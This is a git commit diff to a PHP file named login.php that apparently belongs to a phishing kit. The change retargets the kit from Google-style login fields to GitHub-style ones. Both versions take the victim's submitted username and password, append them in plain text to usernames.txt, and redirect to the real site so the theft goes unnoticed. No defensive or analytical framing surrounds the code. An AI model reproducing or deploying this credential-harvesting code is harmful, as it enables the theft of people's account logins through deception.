5b3219be420ef1d09c0f5da5121bc10b207faf68
gurugovind600 <68151919+gurugovind600@users.noreply.github.com>
2020-10-03 17:08:49 +0530

    Github

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
-header('Location: https://google.com/');
+file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://github.com');
 exit();
